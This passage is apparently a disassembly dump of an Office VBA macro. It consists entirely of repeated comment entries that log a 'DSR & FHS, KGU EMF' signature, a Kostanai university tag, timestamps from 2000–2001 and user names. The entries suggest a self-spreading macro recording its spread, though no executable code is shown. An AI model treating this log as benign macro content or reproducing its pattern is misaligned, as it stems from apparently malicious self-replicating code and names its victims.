' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #230:
' 	QuoteRem 0x0000 0x0020 " 10:51:44 - ñóááîòà, 17 èþí 2000"
' Line #231:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #232:
' 	QuoteRem 0x0000 0x0000 ""
' Line #233:
' Line #234:
' Line #235:
' Line #236:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #237:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #238:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #239:
' 	QuoteRem 0x0000 0x0020 " 10:56:16 - ñóááîòà, 17 èþí 2000"
' Line #240:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #241:
' 	QuoteRem 0x0000 0x0000 ""
' Line #242:
' Line #243:
' Line #244:
' Line #245:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #246:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #247:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #248:
' 	QuoteRem 0x0000 0x0020 " 10:57:13 - ñóááîòà, 17 èþí 2000"
' Line #249:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #250:
' 	QuoteRem 0x0000 0x0000 ""
' Line #251:
' Line #252:
' Line #253:
' Line #254:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #255:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #256:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #257:
' 	QuoteRem 0x0000 0x0020 " 12:11:33 - ñóááîòà, 17 èþí 2000"
' Line #258:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #259:
' 	QuoteRem 0x0000 0x0000 ""
' Line #260:
' Line #261:
' Line #262:
' Line #263:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #264:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #265:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #266:
' 	QuoteRem 0x0000 0x0024 " 13:26:34 - ïîíåäåëüíèê, 19 èþí 2000"
' Line #267:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #268:
' 	QuoteRem 0x0000 0x0000 ""
' Line #269:
' Line #270:
' Line #271:
' Line #272:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #273:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #274:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #275:
' 	QuoteRem 0x0000 0x0020 " 13:33:11 - âòîðíèê, 27 èþí 2000"
' Line #276:
' 	QuoteRem 0x0000 0x000E " Ñ.Õ. Åñåíáàåâ"
' Line #277:
' 	QuoteRem 0x0000 0x0000 ""
' Line #278:
' Line #279:
' Line #280:
' Line #281:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #282:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #283:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #284:
' 	QuoteRem 0x0000 0x0020 " 14:13:47 - âòîðíèê, 27 èþí 2000"
' Line #285:
' 	QuoteRem 0x0000 0x000E " Ñ.Õ. Åñåíáàåâ"
' Line #286:
' 	QuoteRem 0x0000 0x0000 ""
' Line #287:
' Line #288:
' Line #289:
' Line #290:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #291:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #292:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #293:
' 	QuoteRem 0x0000 0x001E " 14:49:56 - ñðåäà, 28 èþí 2000"
' Line #294:
' 	QuoteRem 0x0000 0x0010 " Indi G.Ospanova"
' Line #295:
' 	QuoteRem 0x0000 0x0000 ""
' Line #296:
' Line #297:
' Line #298:
' Line #299:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #300:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #301:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #302:
' 	QuoteRem 0x0000 0x0024 " 14:12:22 - ïîíåäåëüíèê, 17 èþë 2000"
' Line #303:
' 	QuoteRem 0x0000 0x000A " Àëåêñàíäð"
' Line #304:
' 	QuoteRem 0x0000 0x0000 ""
' Line #305:
' Line #306:
' Line #307:
' Line #308:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #309:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #310:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #311:
' 	QuoteRem 0x0000 0x0024 " 14:16:56 - ïîíåäåëüíèê, 17 èþë 2000"
' Line #312:
' 	QuoteRem 0x0000 0x000A " Àëåêñàíäð"
' Line #313:
' 	QuoteRem 0x0000 0x0000 ""
' Line #314:
' Line #315:
' Line #316:
' Line #317:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #318:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #319:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #320:
' 	QuoteRem 0x0000 0x0020 " 18:26:40 - âòîðíèê, 18 èþë 2000"
' Line #321:
' 	QuoteRem 0x0000 0x000B "  Àëåêñàíäð"
' Line #322:
' 	QuoteRem 0x0000 0x0000 ""
' Line #323:
' Line #324:
' Line #325:
' Line #326:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #327:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #328:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #329:
' 	QuoteRem 0x0000 0x0020 " 08:22:23 - ÷åòâåðã, 20 èþë 2000"
' Line #330:
' 	QuoteRem 0x0000 0x000B "  Àëåêñàíäð"
' Line #331:
' 	QuoteRem 0x0000 0x0000 ""
' Line #332:
' Line #333:
' Line #334:
' Line #335:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #336:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #337:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #338:
' 	QuoteRem 0x0000 0x0020 " 10:33:06 - ÷åòâåðã, 20 èþë 2000"
' Line #339:
' 	QuoteRem 0x0000 0x000B "  Àëåêñàíäð"
' Line #340:
' 	QuoteRem 0x0000 0x0000 ""
' Line #341:
' Line #342:
' Line #343:
' Line #344:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #345:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #346:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #347:
' 	QuoteRem 0x0000 0x0020 " 18:08:01 - ÷åòâåðã, 20 èþë 2000"
' Line #348:
' 	QuoteRem 0x0000 0x000B "  Àëåêñàíäð"
' Line #349:
' 	QuoteRem 0x0000 0x0000 ""
' Line #350:
' Line #351:
' Line #352:
' Line #353:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #354:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #355:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #356:
' 	QuoteRem 0x0000 0x0024 " 10:34:42 - âîñêðåñåíüå, 23 èþë 2000"
' Line #357:
' 	QuoteRem 0x0000 0x000B "  Àëåêñàíäð"
' Line #358:
' 	QuoteRem 0x0000 0x0000 ""
' Line #359:
' Line #360:
' Line #361:
' Line #362:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #363:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #364:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #365:
' 	QuoteRem 0x0000 0x0024 " 11:45:27 - âîñêðåñåíüå, 23 èþë 2000"
' Line #366:
' 	QuoteRem 0x0000 0x000B "  Àëåêñàíäð"
' Line #367:
' 	QuoteRem 0x0000 0x0000 ""
' Line #368:
' Line #369:
' Line #370:
' Line #371:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #372:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #373:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #374:
' 	QuoteRem 0x0000 0x0020 " 11:53:05 - âòîðíèê, 25 èþë 2000"
' Line #375:
' 	QuoteRem 0x0000 0x0005 " CCTT"
' Line #376:
' 	QuoteRem 0x0000 0x0000 ""
' Line #377:
' Line #378:
' Line #379:
' Line #380:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #381:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #382:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #383:
' 	QuoteRem 0x0000 0x0020 " 08:53:34 - ÷åòâåðã, 27 èþë 2000"
' Line #384:
' 	QuoteRem 0x0000 0x000B " ðåàíèìàòîð"
' Line #385:
' 	QuoteRem 0x0000 0x0000 ""
' Line #386:
' Line #387:
' Line #388:
' Line #389:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #390:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #391:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #392:
' 	QuoteRem 0x0000 0x001F " 17:37:06 - âòîðíèê, 1 àâã 2000"
' Line #393:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #394:
' 	QuoteRem 0x0000 0x0000 ""
' Line #395:
' Line #396:
' Line #397:
' Line #398:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #399:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #400:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #401:
' 	QuoteRem 0x0000 0x001D " 12:46:13 - ñðåäà, 2 àâã 2000"
' Line #402:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #403:
' 	QuoteRem 0x0000 0x0000 ""
' Line #404:
' Line #405:
' Line #406:
' Line #407:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #408:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #409:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #410:
' 	QuoteRem 0x0000 0x001D " 18:22:38 - ñðåäà, 2 àâã 2000"
' Line #411:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #412:
' 	QuoteRem 0x0000 0x0000 ""
' Line #413:
' Line #414:
' Line #415:
' Line #416:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #417:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #418:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #419:
' 	QuoteRem 0x0000 0x0024 " 09:11:48 - ïîíåäåëüíèê, 21 àâã 2000"
' Line #420:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #421:
' 	QuoteRem 0x0000 0x0000 ""
' Line #422:
' Line #423:
' Line #424:
' Line #425:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #426:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #427:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #428:
' 	QuoteRem 0x0000 0x0024 " 15:01:19 - ïîíåäåëüíèê, 21 àâã 2000"
' Line #429:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #430:
' 	QuoteRem 0x0000 0x0000 ""
' Line #431:
' Line #432:
' Line #433:
' Line #434:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #435:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #436:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #437:
' 	QuoteRem 0x0000 0x0020 " 09:38:46 - âòîðíèê, 22 àâã 2000"
' Line #438:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #439:
' 	QuoteRem 0x0000 0x0000 ""
' Line #440:
' Line #441:
' Line #442:
' Line #443:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #444:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #445:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #446:
' 	QuoteRem 0x0000 0x0020 " 11:14:24 - ïÿòíèöà, 25 àâã 2000"
' Line #447:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #448:
' 	QuoteRem 0x0000 0x0000 ""
' Line #449:
' Line #450:
' Line #451:
' Line #452:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #453:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #454:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #455:
' 	QuoteRem 0x0000 0x0020 " 09:43:34 - ïÿòíèöà, 22 ñåí 2000"
' Line #456:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #457:
' 	QuoteRem 0x0000 0x0000 ""
' Line #458:
' Line #459:
' Line #460:
' Line #461:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #462:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #463:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #464:
' 	QuoteRem 0x0000 0x0020 " 13:22:22 - ïÿòíèöà, 22 ñåí 2000"
' Line #465:
' 	QuoteRem 0x0000 0x0011 " Reanimator 99 CD"
' Line #466:
' 	QuoteRem 0x0000 0x0000 ""
' Line #467:
' Line #468:
' Line #469:
' Line #470:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #471:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #472:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #473:
' 	QuoteRem 0x0000 0x0020 " 11:14:55 - âòîðíèê, 10 îêò 2000"
' Line #474:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #475:
' 	QuoteRem 0x0000 0x0000 ""
' Line #476:
' Line #477:
' Line #478:
' Line #479:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #480:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #481:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #482:
' 	QuoteRem 0x0000 0x0020 " 21:48:10 - ÷åòâåðã, 19 îêò 2000"
' Line #483:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #484:
' 	QuoteRem 0x0000 0x0000 ""
' Line #485:
' Line #486:
' Line #487:
' Line #488:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #489:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #490:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #491:
' 	QuoteRem 0x0000 0x001E " 16:24:45 - ñðåäà, 29 íîÿ 2000"
' Line #492:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #493:
' 	QuoteRem 0x0000 0x0000 ""
' Line #494:
' Line #495:
' Line #496:
' Line #497:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #498:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #499:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #500:
' 	QuoteRem 0x0000 0x0020 " 09:23:28 - ÷åòâåðã, 30 íîÿ 2000"
' Line #501:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #502:
' 	QuoteRem 0x0000 0x0000 ""
' Line #503:
' Line #504:
' Line #505:
' Line #506:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #507:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #508:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #509:
' 	QuoteRem 0x0000 0x0020 " 11:58:47 - ÷åòâåðã, 30 íîÿ 2000"
' Line #510:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #511:
' 	QuoteRem 0x0000 0x0000 ""
' Line #512:
' Line #513:
' Line #514:
' Line #515:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #516:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #517:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #518:
' 	QuoteRem 0x0000 0x001F " 11:36:47 - ïÿòíèöà, 1 äåê 2000"
' Line #519:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #520:
' 	QuoteRem 0x0000 0x0000 ""
' Line #521:
' Line #522:
' Line #523:
' Line #524:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #525:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #526:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #527:
' 	QuoteRem 0x0000 0x001F " 13:23:31 - ïÿòíèöà, 5 ÿíâ 2001"
' Line #528:
' 	QuoteRem 0x0000 0x0005 " Serg"
' Line #529:
' 	QuoteRem 0x0000 0x0000 ""
' Line #530:
' Line #531:
' Line #532:
' Line #533:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #534:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #535:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #536:
' 	QuoteRem 0x0000 0x0023 " 11:54:34 - ïîíåäåëüíèê, 8 ÿíâ 2001"
' Line #537:
' 	QuoteRem 0x0000 0x0005 " Serg"
' Line #538:
' 	QuoteRem 0x0000 0x0000 ""
' Line #539:
' Line #540:
' Line #541:
' Line #542:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #543:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #544:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #545:
' 	QuoteRem 0x0000 0x001F " 14:36:35 - âòîðíèê, 9 ÿíâ 2001"
' Line #546:
' 	QuoteRem 0x0000 0x0005 " áâã¤"
' Line #547:
' 	QuoteRem 0x0000 0x0000 ""
' Line #548:
' Line #549:
' Line #550:
' Line #551:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #552:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #553:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #554:
' 	QuoteRem 0x0000 0x001F " 15:05:48 - âòîðíèê, 9 ÿíâ 2001"
' Line #555:
' 	QuoteRem 0x0000 0x0005 " áâã¤"
' Line #556:
' 	QuoteRem 0x0000 0x0000 ""
' Line #557:
' Line #558:
' Line #559:
' Line #560:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #561:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #562:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #563:
' 	QuoteRem 0x0000 0x001F " 18:23:03 - âòîðíèê, 9 ÿíâ 2001"
' Line #564:
' 	QuoteRem 0x0000 0x0005 " áâã¤"
' Line #565:
' 	QuoteRem 0x0000 0x0000 ""
' Line #566:
' Line #567:
' Line #568:
' Line #569:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #570:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #571:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #572:
' 	QuoteRem 0x0000 0x001E " 10:32:55 - ñðåäà, 10 ÿíâ 2001"
' Line #573:
' 	QuoteRem 0x0000 0x0005 " áâã¤"
' Line #574:
' 	QuoteRem 0x0000 0x0000 ""
' Line #575:
' Line #576:
' Line #577:
' Line #578:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #579:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #580:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #581:
' 	QuoteRem 0x0000 0x0020 " 09:33:04 - ïÿòíèöà, 12 ÿíâ 2001"
' Line #582:
' 	QuoteRem 0x0000 0x0005 " áâã¤"
' Line #583:
' 	QuoteRem 0x0000 0x0000 ""
' Line #584:
' Line #585:
' Line #586:
' Line #587:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #588:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #589:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #590:
' 	QuoteRem 0x0000 0x0020 " 13:48:13 - ïÿòíèöà, 12 ÿíâ 2001"
' Line #591:
' 	QuoteRem 0x0000 0x0005 " áâã¤"
' Line #592:
' 	QuoteRem 0x0000 0x0000 ""
' Line #593:
' Line #594:
' Line #595:
' Line #596:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #597:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #598:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #599:
' 	QuoteRem 0x0000 0x0024 " 01:03:22 - ïîíåäåëüíèê, 15 ÿíâ 2001"
' Line #600:
' 	QuoteRem 0x0000 0x0007 " Jordan"
' Line #601:
' 	QuoteRem 0x0000 0x0000 ""
' Line #602:
' Line #603:
' Line #604:
' Line #605:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #606:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #607:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #608:
' 	QuoteRem 0x0000 0x001F " 18:08:12 - ïÿòíèöà, 2 ôåâ 2001"
' Line #609:
' 	QuoteRem 0x0000 0x0005 " Serg"
' Line #610:
' 	QuoteRem 0x0000 0x0000 ""
' Line #611:
' Line #612:
' Line #613:
' Line #614:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #615:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #616:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #617:
' 	QuoteRem 0x0000 0x0020 " 17:49:01 - ïÿòíèöà, 16 ôåâ 2001"
' Line #618:
' 	QuoteRem 0x0000 0x0005 " Serg"
' Line #619:
' 	QuoteRem 0x0000 0x0000 ""
' Line #620:
' Line #621:
' Line #622:
' Line #623:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #624:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #625:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #626:
' 	QuoteRem 0x0000 0x0020 " 13:12:13 - ñóááîòà, 17 ôåâ 2001"
' Line #627:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #628:
' 	QuoteRem 0x0000 0x0000 ""
' Line #629:
' Line #630:
' Line #631:
' Line #632:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #633:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #634:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #635:
' 	QuoteRem 0x0000 0x0020 " 13:35:12 - ñóááîòà, 17 ôåâ 2001"
' Line #636:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #637:
' 	QuoteRem 0x0000 0x0000 ""
' Line #638:
' Line #639:
' Line #640:
' Line #641:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #642:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #643:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #644:
' 	QuoteRem 0x0000 0x0020 " 13:35:19 - ñóááîòà, 17 ôåâ 2001"
' Line #645:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #646:
' 	QuoteRem 0x0000 0x0000 ""
' Line #647:
' Line #648:
' Line #649:
' Line #650:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #651:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #652:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #653:
' 	QuoteRem 0x0000 0x0020 " 13:35:26 - ñóááîòà, 17 ôåâ 2001"
' Line #654:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #655:
' 	QuoteRem 0x0000 0x0000 ""
' Line #656:
' Line #657:
' Line #658:
' Line #659:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #660:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #661:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #662:
' 	QuoteRem 0x0000 0x0020 " 13:35:31 - ñóááîòà, 17 ôåâ 2001"
' Line #663:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #664:
' 	QuoteRem 0x0000 0x0000 ""
' Line #665:
' Line #666:
' Line #667:
' Line #668:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #669:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #670:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #671:
' 	QuoteRem 0x0000 0x0020 " 13:35:37 - ñóááîòà, 17 ôåâ 2001"
' Line #672:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #673:
' 	QuoteRem 0x0000 0x0000 ""
' Line #674:
' Line #675:
' Line #676:
' Line #677:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #678:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #679:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #680:
' 	QuoteRem 0x0000 0x0020 " 13:35:44 - ñóááîòà, 17 ôåâ 2001"
' Line #681:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #682:
' 	QuoteRem 0x0000 0x0000 ""
' Line #683:
' Line #684:
' Line #685:
' Line #686:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #687:
